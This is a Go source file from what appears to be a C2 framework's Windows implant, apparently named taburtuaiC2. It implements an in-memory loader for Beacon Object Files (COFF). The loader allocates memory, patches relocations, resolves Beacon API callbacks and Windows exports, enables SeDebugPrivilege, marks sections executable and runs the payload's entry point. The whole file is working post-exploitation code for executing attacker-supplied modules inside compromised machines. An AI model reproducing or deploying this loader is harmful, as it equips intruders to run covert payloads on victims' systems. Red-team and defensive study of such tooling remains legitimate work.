//go:build windows

package exec

import (
	"encoding/binary"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

const (
	coffMagicAMD64        = 0x8664
	imageRelAMD64Rel32    = 0x0004
	imageRelAMD64Addr64   = 0x0001
	imageRelAMD64Addr32NB = 0x0003
)

type coffFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type coffSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type coffReloc struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

type coffSymbol struct {
	Name           [8]byte
	Value          uint32
	SectionNumber  int16
	Type           uint16
	StorageClass   uint8
	AuxSymbolCount uint8
}

type bofSectionAlloc struct {
	hdr  *coffSectionHeader
	mem  unsafe.Pointer
	size uint32
}

var (
	bofMu     sync.Mutex
	bofOutput strings.Builder
)

func bofAppendOutput(s string) {
	bofMu.Lock()
	bofOutput.WriteString(s)
	bofMu.Unlock()
}

// BOFResult holds the output and error string from a BOF execution.
type BOFResult struct {
	Output string
	Err    string
}

type dataBOF struct {
	original *byte
	buffer   *byte
	length   int32
	size     int32
}

//go:nosplit
func beaconDataParse(parser *dataBOF, buffer *byte, length int32) {
	parser.original = buffer
	parser.buffer = buffer
	parser.length = length
	parser.size = length
}

//go:nosplit
func beaconDataInt(parser *dataBOF) int32 {
	if parser.length < 4 {
		return 0
	}
	v := int32(binary.LittleEndian.Uint32(unsafe.Slice(parser.buffer, 4)))
	parser.buffer = (*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(parser.buffer)) + 4))
	parser.length -= 4
	return v
}

//go:nosplit
func beaconDataShort(parser *dataBOF) int16 {
	if parser.length < 2 {
		return 0
	}
	v := int16(binary.LittleEndian.Uint16(unsafe.Slice(parser.buffer, 2)))
	parser.buffer = (*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(parser.buffer)) + 2))
	parser.length -= 2
	return v
}

//go:nosplit
func beaconDataLength(parser *dataBOF) int32 { return parser.length }

//go:nosplit
func beaconDataExtract(parser *dataBOF, size *int32) *byte {
	if parser.length < 4 {
		return nil
	}
	blobLen := int32(binary.LittleEndian.Uint32(unsafe.Slice(parser.buffer, 4)))
	parser.buffer = (*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(parser.buffer)) + 4))
	parser.length -= 4
	if blobLen <= 0 || parser.length < blobLen {
		return nil
	}
	ptr := parser.buffer
	parser.buffer = (*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(parser.buffer)) + uintptr(blobLen)))
	parser.length -= blobLen
	if size != nil {
		*size = blobLen
	}
	return ptr
}

//go:nosplit
func beaconPrintfCB(callType uintptr, fmtPtr uintptr, a0, a1, a2, a3 uintptr) uintptr {
	if fmtPtr == 0 {
		return 0
	}
	fmtStr := winsyscall.HgCString(fmtPtr)
	result := bofSprintf(fmtStr, a0, a1, a2, a3)
	bofAppendOutput(result)
	return 0
}

//go:nosplit
func beaconOutputCB(callType, dataPtr, dataLen uintptr) uintptr {
	if dataPtr == 0 || dataLen == 0 {
		return 0
	}
	bytes := unsafe.Slice((*byte)(unsafe.Pointer(dataPtr)), dataLen)
	bofAppendOutput(string(bytes))
	return 0
}

func bofSprintf(format string, args ...uintptr) string {
	var sb strings.Builder
	argIdx := 0
	i := 0
	for i < len(format) {
		if format[i] != '%' || i+1 >= len(format) {
			sb.WriteByte(format[i])
			i++
			continue
		}
		i++
		spec := format[i]
		i++
		var arg uintptr
		if argIdx < len(args) {
			arg = args[argIdx]
			argIdx++
		}
		switch spec {
		case 's':
			if arg != 0 {
				sb.WriteString(winsyscall.HgCString(arg))
			}
		case 'd', 'i':
			sb.WriteString(fmt.Sprintf("%d", int64(int32(arg))))
		case 'u':
			sb.WriteString(fmt.Sprintf("%d", uint32(arg)))
		case 'x':
			sb.WriteString(fmt.Sprintf("%x", arg))
		case 'X':
			sb.WriteString(fmt.Sprintf("%X", arg))
		case 'p':
			sb.WriteString(fmt.Sprintf("0x%X", arg))
		case 'l':
			if i < len(format) {
				sub := format[i]
				i++
				switch sub {
				case 'd', 'i':
					sb.WriteString(fmt.Sprintf("%d", int64(arg)))
				case 'u':
					sb.WriteString(fmt.Sprintf("%d", uint64(arg)))
				case 'x':
					sb.WriteString(fmt.Sprintf("%x", arg))
				}
			}
		case '%':
			sb.WriteByte('%')
			argIdx--
		default:
			sb.WriteByte('%')
			sb.WriteByte(spec)
			argIdx--
		}
	}
	return sb.String()
}

func resolveExternalSym(name string) (uintptr, error) {
	clean := strings.TrimPrefix(name, "__imp_")

	switch clean {
	case "BeaconPrintf":
		return windows.NewCallback(beaconPrintfCB), nil
	case "BeaconOutput":
		return windows.NewCallback(beaconOutputCB), nil
	case "BeaconDataParse":
		return windows.NewCallback(func(parser, buf, length uintptr) uintptr {
			beaconDataParse(
				(*dataBOF)(unsafe.Pointer(parser)),
				(*byte)(unsafe.Pointer(buf)),
				int32(length),
			)
			return 0
		}), nil
	case "BeaconDataInt":
		return windows.NewCallback(func(parser uintptr) uintptr {
			return uintptr(beaconDataInt((*dataBOF)(unsafe.Pointer(parser))))
		}), nil
	case "BeaconDataShort":
		return windows.NewCallback(func(parser uintptr) uintptr {
			return uintptr(beaconDataShort((*dataBOF)(unsafe.Pointer(parser))))
		}), nil
	case "BeaconDataLength":
		return windows.NewCallback(func(parser uintptr) uintptr {
			return uintptr(beaconDataLength((*dataBOF)(unsafe.Pointer(parser))))
		}), nil
	case "BeaconDataExtract":
		return windows.NewCallback(func(parser, sizePtr uintptr) uintptr {
			return uintptr(unsafe.Pointer(beaconDataExtract(
				(*dataBOF)(unsafe.Pointer(parser)),
				(*int32)(unsafe.Pointer(sizePtr)),
			)))
		}), nil
	case "BeaconIsAdmin":
		return windows.NewCallback(func() uintptr {
			if err := enablePrivilege("SeDebugPrivilege"); err == nil {
				return 1
			}
			return 0
		}), nil
	case "BeaconCleanupProcess":
		return windows.NewCallback(func(bdata uintptr) uintptr { return 0 }), nil
	case "BeaconInjectProcess":
		return windows.NewCallback(func(a, b, c, d, e, f uintptr) uintptr { return 0 }), nil
	case "BeaconInjectTemporaryProcess":
		return windows.NewCallback(func(a, b, c, d, e uintptr) uintptr { return 0 }), nil
	case "BeaconSpawnTemporaryProcess":
		return windows.NewCallback(func(a, b, c, d uintptr) uintptr { return 0 }), nil
	case "BeaconGetSpawnTo":
		return windows.NewCallback(func(a, b, c uintptr) uintptr { return 0 }), nil
	case "BeaconRevertToken":
		return windows.NewCallback(func() uintptr { return 0 }), nil
	case "BeaconUseToken":
		return windows.NewCallback(func(a uintptr) uintptr { return 0 }), nil
	case "BeaconOpenProcess":
		return windows.NewCallback(func(pid, rights uintptr) uintptr {
			h, _ := windows.OpenProcess(uint32(rights), false, uint32(pid))
			return uintptr(h)
		}), nil
	case "BeaconOpenThread":
		return windows.NewCallback(func(tid, rights uintptr) uintptr {
			h, _, _ := winsyscall.ProcOpenThread.Call(rights, 0, tid)
			return h
		}), nil
	}

	for _, dll := range []string{
		"kernel32.dll", "ntdll.dll", "advapi32.dll",
		"user32.dll", "shell32.dll", "ole32.dll",
	} {
		h, err := windows.LoadLibrary(dll)
		if err != nil {
			continue
		}
		proc, err := windows.GetProcAddress(h, clean)
		if err == nil {
			return proc, nil
		}
	}
	return 0, fmt.Errorf("unresolved external: %s", name)
}

func coffSymName(sym *coffSymbol, data []byte, strTableOff uintptr) string {
	if sym.Name[0] == 0 && sym.Name[1] == 0 && sym.Name[2] == 0 && sym.Name[3] == 0 {
		off := binary.LittleEndian.Uint32(sym.Name[4:])
		start := int(strTableOff) + int(off)
		end := start
		for end < len(data) && data[end] != 0 {
			end++
		}
		return string(data[start:end])
	}
	end := 0
	for end < 8 && sym.Name[end] != 0 {
		end++
	}
	return string(sym.Name[:end])
}

func findBOFEntry(data []byte, symOff uintptr, symCount uint32, strOff uintptr, secs []bofSectionAlloc) (uintptr, error) {
	for i := uint32(0); i < symCount; i++ {
		sym := (*coffSymbol)(unsafe.Pointer(&data[int(symOff)+int(i)*int(unsafe.Sizeof(coffSymbol{}))]))
		name := coffSymName(sym, data, strOff)
		if name == "go" || name == "beacon_main" || name == "_go" || name == "_beacon_main" {
			if sym.SectionNumber > 0 && int(sym.SectionNumber)-1 < len(secs) {
				s := secs[int(sym.SectionNumber)-1]
				return uintptr(unsafe.Add(s.mem, sym.Value)), nil
			}
		}
	}
	return 0, fmt.Errorf("no 'go' or 'beacon_main' entrypoint found in COFF")
}

// RunBOF loads and executes a COFF BOF with the given packed argument blob.
func RunBOF(coffBytes []byte, args []byte) (*BOFResult, error) {
	bofMu.Lock()
	bofOutput.Reset()
	bofMu.Unlock()

	res := &BOFResult{}
	if len(coffBytes) < int(unsafe.Sizeof(coffFileHeader{})) {
		return res, fmt.Errorf("COFF too small (%d bytes)", len(coffBytes))
	}

	hdr := (*coffFileHeader)(unsafe.Pointer(&coffBytes[0]))
	if hdr.Machine != coffMagicAMD64 {
		return res, fmt.Errorf("unsupported COFF machine: 0x%X (expected 0x8664)", hdr.Machine)
	}

	secHdrOff := unsafe.Sizeof(coffFileHeader{}) + uintptr(hdr.SizeOfOptionalHeader)
	symTableOff := uintptr(hdr.PointerToSymbolTable)
	symCount := uint32(hdr.NumberOfSymbols)
	strTableOff := symTableOff + uintptr(symCount)*unsafe.Sizeof(coffSymbol{})

	sections := make([]bofSectionAlloc, hdr.NumberOfSections)
	for i := uint16(0); i < hdr.NumberOfSections; i++ {
		sh := (*coffSectionHeader)(unsafe.Pointer(
			&coffBytes[int(secHdrOff)+int(i)*int(unsafe.Sizeof(coffSectionHeader{}))],
		))
		sz := sh.SizeOfRawData
		if sz == 0 {
			sections[i] = bofSectionAlloc{hdr: sh}
			continue
		}
		mem, _, e := winsyscall.ProcVirtualAllocEx.Call(
			uintptr(^uintptr(0)-1), 0, uintptr(sz),
			uintptr(winsyscall.MemCommit|winsyscall.MemReserve), uintptr(winsyscall.PageReadWrite),
		)
		if mem == 0 {
			bofFreeAll(sections)
			return res, fmt.Errorf("VirtualAllocEx(section %d): %v", i, e)
		}
		memPtr := unsafe.Pointer(mem) //nolint:unsafeptr
		dst := unsafe.Slice((*byte)(memPtr), sz)
		copy(dst, coffBytes[sh.PointerToRawData:sh.PointerToRawData+sz])
		sections[i] = bofSectionAlloc{hdr: sh, mem: memPtr, size: sz}
	}
	defer bofFreeAll(sections)

	resolveSymbol := func(idx uint32) (uintptr, error) {
		if idx >= symCount {
			return 0, fmt.Errorf("symbol index %d out of range", idx)
		}
		sym := (*coffSymbol)(unsafe.Pointer(
			&coffBytes[int(symTableOff)+int(idx)*int(unsafe.Sizeof(coffSymbol{}))],
		))
		if sym.SectionNumber > 0 {
			secIdx := int(sym.SectionNumber) - 1
			if secIdx >= len(sections) {
				return 0, fmt.Errorf("section index %d out of range", secIdx)
			}
			return uintptr(unsafe.Add(sections[secIdx].mem, sym.Value)), nil
		}
		name := coffSymName(sym, coffBytes, strTableOff)
		return resolveExternalSym(name)
	}

	for i := range sections {
		sh := sections[i].hdr
		if sh.NumberOfRelocations == 0 || sections[i].mem == nil {
			continue
		}
		relocBase := uintptr(sh.PointerToRelocations)
		for r := uint16(0); r < sh.NumberOfRelocations; r++ {
			rel := (*coffReloc)(unsafe.Pointer(
				&coffBytes[int(relocBase)+int(r)*int(unsafe.Sizeof(coffReloc{}))],
			))
			target, err := resolveSymbol(rel.SymbolTableIndex)
			if err != nil {
				return res, fmt.Errorf("reloc %d: %w", r, err)
			}
			patchPtr := unsafe.Add(sections[i].mem, rel.VirtualAddress)
			switch rel.Type {
			case imageRelAMD64Rel32:
				delta := int32(int64(target) - int64(uintptr(patchPtr)+4))
				*(*int32)(patchPtr) += delta
			case imageRelAMD64Addr64:
				*(*uint64)(patchPtr) = uint64(target)
			case imageRelAMD64Addr32NB:
				*(*uint32)(patchPtr) = uint32(target)
			}
		}
	}

	// Protect exec COFF sections as RX — relocations are applied, no further writes needed.
	var bofOldProt uint32
	for i := range sections {
		if sections[i].mem == nil || sections[i].size == 0 {
			continue
		}
		if sections[i].hdr.Characteristics&0x20000000 != 0 { // IMAGE_SCN_MEM_EXECUTE
			winsyscall.ProcVirtualProtect.Call(
				uintptr(sections[i].mem), uintptr(sections[i].size),
				uintptr(winsyscall.PageExecRead), uintptr(unsafe.Pointer(&bofOldProt)),
			)
		}
	}

	entryAddr, err := findBOFEntry(coffBytes, symTableOff, symCount, strTableOff, sections)
	if err != nil {
		return res, err
	}

	type entryFn func(argPtr uintptr, argLen uint32)
	fn := *(*entryFn)(unsafe.Pointer(&entryAddr))

	errCh := make(chan error, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		defer func() {
			if r := recover(); r != nil {
				errCh <- fmt.Errorf("BOF panic: %v", r)
			} else {
				errCh <- nil
			}
		}()
		var argPtr uintptr
		var argLen uint32
		if len(args) > 0 {
			argPtr = uintptr(unsafe.Pointer(&args[0]))
			argLen = uint32(len(args))
		}
		fn(argPtr, argLen)
	}()

	if runErr := <-errCh; runErr != nil {
		res.Err = runErr.Error()
	}

	bofMu.Lock()
	res.Output = bofOutput.String()
	bofMu.Unlock()
	return res, nil
}

func bofFreeAll(secs []bofSectionAlloc) {
	for _, s := range secs {
		if s.mem != nil {
			winsyscall.ProcVirtualFreeEx.Call(uintptr(^uintptr(0)-1), uintptr(s.mem), 0, uintptr(winsyscall.MemRelease))
		}
	}
}
